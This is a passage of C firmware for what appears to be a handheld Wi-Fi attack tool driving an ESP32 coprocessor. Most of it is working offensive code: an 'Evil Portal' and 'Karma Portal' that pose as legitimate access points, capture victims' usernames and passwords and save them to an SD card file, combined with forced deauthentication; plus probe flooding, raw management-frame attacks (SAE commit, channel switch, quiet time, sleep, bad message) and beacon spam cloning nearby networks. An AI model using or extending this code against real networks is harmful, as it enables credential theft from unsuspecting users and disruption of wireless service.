	if (!wifi_ext_is_html(f_info->file_name))
	{
		wifi_show_message("EP HTML", "Use .html/.htm", NULL);
		return;
	}

	if (!beacon_make_fullpath(f_info, path, sizeof(path)))
	{
		wifi_show_message("EP HTML", "Bad file path", NULL);
		return;
	}

	if (!wifi_portal_upload_html_path(path, f_info->file_name, true))
	{
		return;
	}

	strncpy(wifi_portal_html_path, path, sizeof(wifi_portal_html_path) - 1);
	wifi_portal_html_path[sizeof(wifi_portal_html_path) - 1] = '\0';
	strncpy(wifi_portal_html_name, f_info->file_name, sizeof(wifi_portal_html_name) - 1);
	wifi_portal_html_name[sizeof(wifi_portal_html_name) - 1] = '\0';
	wifi_portal_cfg_save();
}

void wifi_general_reload_ep_html(void)
{
	wifi_portal_cfg_load();
	if (wifi_portal_html_path[0] == '\0')
	{
		wifi_show_message("Reload HTML", "No saved HTML", "Pick EP HTML File");
		return;
	}

	wifi_portal_upload_html_path(wifi_portal_html_path, wifi_portal_html_name, true);
}

void wifi_general_clear_ep_html(void)
{
	m1_resp_t resp;
	int ret;

	wifi_portal_cfg_load();
	ensure_esp32_ready();
	ret = m1_esp32_simple_cmd(CMD_PORTAL_HTML_CLEAR, &resp, 1000);
	if (ret != 0 || resp.status != RESP_OK)
	{
		wifi_show_message("Clear HTML", "Clear failed", "Flash ESP32 FW?");
		return;
	}

	wifi_portal_html_path[0] = '\0';
	wifi_portal_html_name[0] = '\0';
	wifi_portal_cfg_save();
	wifi_show_message("Clear HTML", "Built-in portal", "will be used");
}

void wifi_general_ep_html_status(void)
{
	wifi_portal_cfg_load();
	if (wifi_portal_html_path[0] == '\0')
	{
		wifi_show_message("HTML Status", "Built-in portal", "No custom file");
		return;
	}

	wifi_show_message("HTML Status", wifi_portal_html_name[0] ?
		wifi_portal_html_name : "Custom HTML", "Saved on SD");
}


/*============================================================================*/
/*  Evil Portal UI                                                           */
/*============================================================================*/

#define EP_MAX_CREDS    16
#define EP_MAX_CRED_LEN 25
#define EP_POLL_MS      2000

typedef struct {
	char username[EP_MAX_CRED_LEN];
	char password[EP_MAX_CRED_LEN];
} ep_cred_t;

static ep_cred_t ep_creds[EP_MAX_CREDS];
static uint8_t ep_cred_count = 0;
static uint8_t ep_view_idx = 0;

static void ep_poll_creds(void)
{
	m1_resp_t resp;
	while (ep_cred_count < EP_MAX_CREDS)
	{
		int ret = m1_esp32_simple_cmd(CMD_PORTAL_CREDS, &resp, 1000);
		if (ret != 0 || resp.status != RESP_OK || resp.payload_len < 2)
			break;
		uint8_t ulen = resp.payload[0];
		if (ulen == 0 && resp.payload_len == 1)
			break;
		ep_cred_t *c = &ep_creds[ep_cred_count];
		memset(c, 0, sizeof(ep_cred_t));
		if (ulen > EP_MAX_CRED_LEN - 1) ulen = EP_MAX_CRED_LEN - 1;
		memcpy(c->username, &resp.payload[1], ulen);
		uint8_t poff = 1 + ulen;
		if (poff < resp.payload_len)
		{
			uint8_t plen = resp.payload[poff];
			if (plen > EP_MAX_CRED_LEN - 1) plen = EP_MAX_CRED_LEN - 1;
			if (poff + 1 + plen <= resp.payload_len)
				memcpy(c->password, &resp.payload[poff + 1], plen);
		}
		ep_cred_count++;
	}
}

static void ep_save_creds_to_sd(void)
{
	if (ep_cred_count == 0) return;
	f_mkdir("portal");
	FIL fil;
	if (f_open(&fil, "portal/creds.txt", FA_WRITE | FA_OPEN_APPEND) == FR_OK)
	{
		UINT bw;
		for (uint8_t i = 0; i < ep_cred_count; i++)
		{
			char line[80];
			int len = snprintf(line, sizeof(line), "%s : %s\n",
				ep_creds[i].username, ep_creds[i].password);
			f_write(&fil, line, len, &bw);
		}
		f_close(&fil);
	}
}

void wifi_evil_portal(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_cmd_t cmd;
	m1_resp_t resp;
	int spi_ret;
	char ln[26];
	uint32_t start_tick, last_poll;
	const char *portal_ssid = wifi_portal_ssid;
	bool force_deauth_started = false;
	uint8_t force_targets = 0;

	wifi_portal_cfg_load();
	wifi_capture_cfg_load();
	portal_ssid = wifi_portal_ssid;
	ensure_esp32_ready();

	if (wifi_portal_html_path[0] != '\0')
	{
		if (!wifi_portal_upload_html_path(wifi_portal_html_path,
			wifi_portal_html_name, false))
		{
			wifi_show_message("Evil Portal", "Using built-in", "HTML load failed");
		}
	}

	/* Start portal */
	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_PORTAL_START;
	uint8_t slen = (uint8_t)strlen(portal_ssid);
	memcpy(cmd.payload, portal_ssid, slen);
	cmd.payload_len = slen;

	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	m1_u8g2_firstpage();
	u8g2_DrawStr(&m1_u8g2, 6, 15, "Evil Portal");
	u8g2_DrawStr(&m1_u8g2, 6, 30, "Starting...");
	u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
		M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
	m1_u8g2_nextpage();

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Evil Portal");
		u8g2_DrawStr(&m1_u8g2, 6, 30, "Start failed!");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	if (wifi_capture_cfg.ep_deauth)
	{
		force_deauth_started = wifi_force_deauth_start(&resp, &force_targets);
	}

	ep_cred_count = 0;
	ep_view_idx = 0;
	start_tick = HAL_GetTick();
	last_poll = start_tick;

	while (1)
	{
		uint32_t now = HAL_GetTick();
		uint32_t elapsed = (now - start_tick) / 1000;

		if (now - last_poll >= EP_POLL_MS)
		{
			ep_poll_creds();
			last_poll = now;
		}

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"EVIL PORTAL");

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		uint8_t y = SF_Y_START;

		snprintf(ln, sizeof(ln), "SSID: %s", portal_ssid);
		u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

		snprintf(ln, sizeof(ln), "Creds: %d  Time:%lus", ep_cred_count, elapsed);
		u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;

		if (force_deauth_started)
		{
			snprintf(ln, sizeof(ln), "EPDeauth:%d targets", force_targets);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
		}

		if (ep_cred_count > 0)
		{
			uint8_t vi = ep_view_idx;
			if (vi >= ep_cred_count) vi = ep_cred_count - 1;
			snprintf(ln, sizeof(ln), "U:%.20s", ep_creds[vi].username);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
			snprintf(ln, sizeof(ln), "P:%.20s", ep_creds[vi].password);
			u8g2_DrawStr(&m1_u8g2, 2, y, ln);
		}
		else
		{
			u8g2_DrawStr(&m1_u8g2, 2, y, "Waiting for clients...");
		}

		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				ep_save_creds_to_sd();
				wifi_force_deauth_stop(force_deauth_started);
				m1_esp32_simple_cmd(CMD_PORTAL_STOP, &resp, 2000);
				xQueueReset(main_q_hdl);
				break;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (ep_view_idx > 0) ep_view_idx--;
				else if (ep_cred_count > 0) ep_view_idx = ep_cred_count - 1;
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (ep_cred_count > 0)
				{
					ep_view_idx++;
					if (ep_view_idx >= ep_cred_count) ep_view_idx = 0;
				}
			}
		}
	}
}


/*============================================================================*/
/*  Probe Flood UI                                                           */
/*============================================================================*/

void wifi_probe_flood(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_resp_t resp;
	int spi_ret;
	char ln[26];
	uint32_t start_tick;

	ensure_esp32_ready();

	spi_ret = m1_esp32_simple_cmd(CMD_PROBE_FLOOD_START, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Probe Flood");
		u8g2_DrawStr(&m1_u8g2, 6, 30, "Start failed!");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	start_tick = HAL_GetTick();

	while (1)
	{
		uint32_t elapsed = (HAL_GetTick() - start_tick) / 1000;

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"PROBE FLOOD");

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		uint8_t y = SF_Y_START;

		u8g2_DrawStr(&m1_u8g2, 2, y, "Flooding probe requests");
		y += SF_Y_STEP;
		u8g2_DrawStr(&m1_u8g2, 2, y, "Random MACs, broadcast");
		y += SF_Y_STEP;

		snprintf(ln, sizeof(ln), "Time: %lus", elapsed);
		u8g2_DrawStr(&m1_u8g2, 2, y, ln);

		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_PROBE_FLOOD_STOP, &resp, 1000);
				xQueueReset(main_q_hdl);
				break;
			}
		}
	}
}

/*============================================================================*/
/*  Raw WiFi Management Attack UI                                             */
/*============================================================================*/

#define WIFI_RAW_ATK_SAE_COMMIT   0
#define WIFI_RAW_ATK_CHAN_SWITCH  1
#define WIFI_RAW_ATK_QUIET_TIME   2
#define WIFI_RAW_ATK_SLEEP        3
#define WIFI_RAW_ATK_BAD_MSG      4

static bool wifi_raw_attack_first_selected_ap(uint16_t *idx_out)
{
	if (!ap_list || ap_count == 0)
	{
		return false;
	}

	for (uint16_t i = 0; i < ap_count; i++)
	{
		if (ap_list[i].selected && wifi_mac_is_nonzero(ap_list[i].bssid) &&
			ap_list[i].channel > 0)
		{
			if (idx_out) *idx_out = i;
			return true;
		}
	}

	return false;
}

static void wifi_raw_attack_run_ap(uint8_t mode, const char *title, wifi_ap_t *ap)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_cmd_t cmd;
	m1_resp_t resp;
	char ln[26];
	uint32_t start_tick;
	int spi_ret;

	if (!ap || !wifi_mac_is_nonzero(ap->bssid) || ap->channel == 0)
	{
		wifi_show_message(title, "Bad target", "Need BSSID/channel");
		return;
	}

	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_WIFI_RAW_ATTACK_START;
	cmd.payload[0] = mode;
	cmd.payload[1] = ap->channel;
	memcpy(&cmd.payload[2], ap->bssid, 6);
	uint8_t sl = (uint8_t)strnlen(ap->ssid, 32);
	if (sl > 32) sl = 32;
	cmd.payload[8] = sl;
	if (sl > 0) memcpy(&cmd.payload[9], ap->ssid, sl);
	cmd.payload_len = 9 + sl;

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		wifi_show_message(title, "Start failed", "Flash ESP32 FW?");
		return;
	}

	start_tick = HAL_GetTick();
	while (1)
	{
		uint32_t elapsed = (HAL_GetTick() - start_tick) / 1000;

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, title);

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		snprintf(ln, sizeof(ln), "CH:%u Time:%lus", ap->channel, elapsed);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
		snprintf(ln, sizeof(ln), "%.24s", ap->ssid[0] ? ap->ssid : "*hidden*");
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
		snprintf(ln, sizeof(ln), "%02X:%02X:%02X:%02X:%02X:%02X",
			ap->bssid[0], ap->bssid[1], ap->bssid[2],
			ap->bssid[3], ap->bssid[4], ap->bssid[5]);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, "Mgmt frames active");
		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_WIFI_RAW_ATTACK_STOP, &resp, 1000);
				xQueueReset(main_q_hdl);
				break;
			}
		}
	}
}

static void wifi_raw_attack_target_ui(uint8_t mode, const char *title)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint16_t list_count;
	uint16_t selected_idx;

	ensure_esp32_ready();

	if (wifi_raw_attack_first_selected_ap(&selected_idx))
	{
		wifi_raw_attack_run_ap(mode, title, &ap_list[selected_idx]);
		return;
	}

	if (!ap_list || ap_count == 0)
	{
		wifi_show_message(title, "Scanning APs...", NULL);
		list_count = wifi_do_scan();
	}
	else
	{
		list_count = ap_count;
	}

	if (!list_count)
	{
		wifi_show_message(title, "No AP targets", NULL);
		return;
	}

	wifi_ap_list_print(true);
	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				break;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				wifi_ap_list_print(true);
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
			{
				wifi_ap_list_print(false);
			}
			else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (ap_list && ap_view_idx < ap_count)
				{
					wifi_raw_attack_run_ap(mode, title, &ap_list[ap_view_idx]);
				}
				wifi_ap_list_print(true);
			}
		}
	}
}

void wifi_attack_sae_commit(void)
{
	wifi_raw_attack_target_ui(WIFI_RAW_ATK_SAE_COMMIT, "SAE COMMIT");
}

void wifi_attack_channel_switch(void)
{
	wifi_raw_attack_target_ui(WIFI_RAW_ATK_CHAN_SWITCH, "CHANNEL SWITCH");
}

void wifi_attack_quiet_time(void)
{
	wifi_raw_attack_target_ui(WIFI_RAW_ATK_QUIET_TIME, "QUIET TIME");
}

void wifi_attack_sleep(void)
{
	wifi_raw_attack_target_ui(WIFI_RAW_ATK_SLEEP, "SLEEP ATTACK");
}

void wifi_attack_bad_msg(void)
{
	wifi_raw_attack_target_ui(WIFI_RAW_ATK_BAD_MSG, "BAD MSG");
}

void wifi_attack_karma(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_resp_t resp;
	char ln[26];
	char latest_ssid[33];
	uint32_t start_tick;
	uint32_t last_poll;
	uint32_t elapsed;
	uint32_t probes = 0;
	uint32_t total_probes = 0;
	uint8_t channel = 0;
	int spi_ret;

	ensure_esp32_ready();

	spi_ret = m1_esp32_simple_cmd(CMD_KARMA_START, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		wifi_show_message("Karma", "Start failed", "Flash ESP32 FW?");
		return;
	}

	start_tick = HAL_GetTick();
	last_poll = start_tick;
	memset(latest_ssid, 0, sizeof(latest_ssid));

	while (1)
	{
		uint32_t now = HAL_GetTick();
		elapsed = (now - start_tick) / 1000;

		if (now - last_poll >= 1000)
		{
			spi_ret = m1_esp32_simple_cmd(CMD_KARMA_STATUS, &resp, 1000);
			if (spi_ret == 0 && resp.status == RESP_OK && resp.payload_len >= 6)
			{
				uint8_t slen;
				probes = (uint32_t)resp.payload[1] |
					((uint32_t)resp.payload[2] << 8) |
					((uint32_t)resp.payload[3] << 16) |
					((uint32_t)resp.payload[4] << 24);
				slen = resp.payload[5];
				if (slen > 32) slen = 32;
				if (6 + slen <= resp.payload_len)
				{
					memcpy(latest_ssid, &resp.payload[6], slen);
					latest_ssid[slen] = '\0';
				}
				if (resp.payload_len >= 7 + slen)
				{
					channel = resp.payload[6 + slen];
				}
				if (resp.payload_len >= 9 + slen)
				{
					total_probes = (uint32_t)resp.payload[7 + slen] |
						((uint32_t)resp.payload[8 + slen] << 8);
				}
				}
				last_poll = now;
			}

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
			u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "KARMA");

			u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
			if (latest_ssid[0])
			{
				snprintf(ln, sizeof(ln), "%.24s", latest_ssid);
				u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
			}
			else
			{
				u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, "Waiting for probes...");
			}
			snprintf(ln, sizeof(ln), "Dir:%lu All:%lu",
				(unsigned long)probes, (unsigned long)total_probes);
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
			snprintf(ln, sizeof(ln), "CH:%u Time:%lus", channel, elapsed);
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, "Probe-driven AP");
			u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
			m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_KARMA_STOP, &resp, 2000);
				if (resp.status == RESP_OK && resp.payload_len >= 2)
				{
					probes = resp.payload[0] | ((uint32_t)resp.payload[1] << 8);
				}
				xQueueReset(main_q_hdl);
				break;
			}
		}
	}
}

void wifi_attack_karma_portal(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_resp_t resp;
	char ln[26];
	char latest_ssid[33];
	uint32_t start_tick;
	uint32_t last_poll;
	uint32_t elapsed;
	uint32_t probes = 0;
	uint32_t total_probes = 0;
	uint8_t channel = 0;
	int spi_ret;

	wifi_portal_cfg_load();
	ensure_esp32_ready();

	if (wifi_portal_html_path[0] != '\0')
	{
		if (!wifi_portal_upload_html_path(wifi_portal_html_path,
			wifi_portal_html_name, false))
		{
			wifi_show_message("Karma Portal", "Using built-in", "HTML load failed");
		}
	}

	spi_ret = m1_esp32_simple_cmd(CMD_KARMA_PORTAL_START, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		wifi_show_message("Karma Portal", "Start failed", "Flash ESP32 FW?");
		return;
	}

	ep_cred_count = 0;
	ep_view_idx = 0;
	start_tick = HAL_GetTick();
	last_poll = start_tick;
	memset(latest_ssid, 0, sizeof(latest_ssid));

	while (1)
	{
		uint32_t now = HAL_GetTick();
		elapsed = (now - start_tick) / 1000;

		if (now - last_poll >= 1000)
		{
			spi_ret = m1_esp32_simple_cmd(CMD_KARMA_STATUS, &resp, 1000);
			if (spi_ret == 0 && resp.status == RESP_OK && resp.payload_len >= 6)
			{
				uint8_t slen;
				probes = (uint32_t)resp.payload[1] |
					((uint32_t)resp.payload[2] << 8) |
					((uint32_t)resp.payload[3] << 16) |
					((uint32_t)resp.payload[4] << 24);
				slen = resp.payload[5];
				if (slen > 32) slen = 32;
				if (6 + slen <= resp.payload_len)
				{
					memcpy(latest_ssid, &resp.payload[6], slen);
					latest_ssid[slen] = '\0';
				}
				if (resp.payload_len >= 7 + slen)
				{
					channel = resp.payload[6 + slen];
				}
				if (resp.payload_len >= 9 + slen)
				{
					total_probes = (uint32_t)resp.payload[7 + slen] |
						((uint32_t)resp.payload[8 + slen] << 8);
				}
				}
				ep_poll_creds();
				last_poll = now;
		}

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "KARMA PORTAL");

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		if (latest_ssid[0])
		{
			snprintf(ln, sizeof(ln), "%.24s", latest_ssid);
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
		}
		else
		{
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, "Waiting for probes...");
		}

			snprintf(ln, sizeof(ln), "D:%lu A:%lu C:%d",
				(unsigned long)probes, (unsigned long)total_probes, ep_cred_count);
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);

		if (ep_cred_count > 0)
		{
			uint8_t vi = ep_view_idx;
			if (vi >= ep_cred_count) vi = ep_cred_count - 1;
			snprintf(ln, sizeof(ln), "U:%.20s", ep_creds[vi].username);
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
		}
		else
		{
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, "Portal active");
		}

			snprintf(ln, sizeof(ln), "CH:%u Time:%lus", channel, elapsed);
			u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_KARMA_STOP, &resp, 2000);
				ep_poll_creds();
				ep_save_creds_to_sd();
				xQueueReset(main_q_hdl);
				break;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (ep_view_idx > 0) ep_view_idx--;
				else if (ep_cred_count > 0) ep_view_idx = ep_cred_count - 1;
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (ep_cred_count > 0)
				{
					ep_view_idx++;
					if (ep_view_idx >= ep_cred_count) ep_view_idx = 0;
				}
			}
		}
	}
}


/*============================================================================*/
/*  AP Clone Spam UI                                                         */
/*============================================================================*/

void wifi_attack_ap_clone(void)
{
	m1_cmd_t cmd;
	m1_resp_t resp;
	int spi_ret;
	beacon_load_diag_t load_diag;
	const char *clone_ssids[32];
	uint8_t cloned = 0;
	bool selected_only = false;

	ensure_esp32_ready();

	/* Need cached AP results to clone */
	if (!ap_list || ap_count == 0)
	{
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "AP Clone");
		u8g2_DrawStr(&m1_u8g2, 6, 30, "Scanning APs...");
		u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
			M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
		m1_u8g2_nextpage();

		if (wifi_do_scan() == 0)
		{
			m1_u8g2_firstpage();
			u8g2_DrawStr(&m1_u8g2, 6, 15, "AP Clone");
			u8g2_DrawStr(&m1_u8g2, 6, 30, "No APs found!");
			m1_u8g2_nextpage();
			HAL_Delay(2000);
			return;
		}
	}

	selected_only = (wifi_selected_ap_count() > 0);
	for (uint16_t i = 0; i < ap_count && cloned < 32; i++)
	{
		if (selected_only && !ap_list[i].selected) continue;
		if (ap_list[i].ssid[0] == '\0') continue;
		clone_ssids[cloned] = ap_list[i].ssid;
		cloned++;
	}

	if (cloned == 0)
	{
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "AP Clone");
		u8g2_DrawStr(&m1_u8g2, 6, 30, selected_only ? "No named selected APs" : "No named APs!");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	uint8_t total = beacon_batch_load(clone_ssids, cloned, &load_diag);
	if (total == 0)
	{
		beacon_load_failed_screen("AP Clone", &load_diag);
		HAL_Delay(2000);
		return;
	}

	beacon_set_flags(0x00);

	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_BEACON_START;
	cmd.payload_len = 0;
	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "AP Clone");
		u8g2_DrawStr(&m1_u8g2, 6, 30, "Start failed!");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	beacon_run_loop("AP CLONE", clone_ssids, cloned, total, false);
}


/*============================================================================*/
/*  Rickroll Beacon (themed preset SSIDs)                                    */
/*============================================================================*/

static const char *rickroll_ssids[] = {
	"We're no strangers",
	"to love",
	"You know the rules",
	"and so do I",
	"A full commitment's",
	"what I'm thinking of",
	"You wouldn't get this",
	"from any other guy",
	"I just wanna tell you",
	"how I'm feeling",
	"Gotta make you",
	"understand",
	"Never gonna give",
	"you up",
	"Never gonna let",
	"you down",
	"Never gonna run",
	"around and desert you",
	"Never gonna make",
	"you cry",
	"Never gonna say",
	"goodbye",
	"Never gonna tell",
	"a lie and hurt you",
};
#define RICKROLL_SSID_COUNT 24

void wifi_attack_rickroll(void)
{
	m1_resp_t resp;
	m1_cmd_t cmd;
	beacon_load_diag_t load_diag;

	ensure_esp32_ready();

	uint8_t total = beacon_batch_load(rickroll_ssids, RICKROLL_SSID_COUNT, &load_diag);
	if (total == 0)
	{
		beacon_load_failed_screen("Rickroll", &load_diag);
		HAL_Delay(2000);
		return;
	}

	beacon_set_flags(0x00);

	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_BEACON_START;
	cmd.payload_len = 0;
	int spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Rickroll");
		u8g2_DrawStr(&m1_u8g2, 6, 30, "Start failed!");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	beacon_run_loop("RICKROLL", rickroll_ssids, RICKROLL_SSID_COUNT, total, true);
}
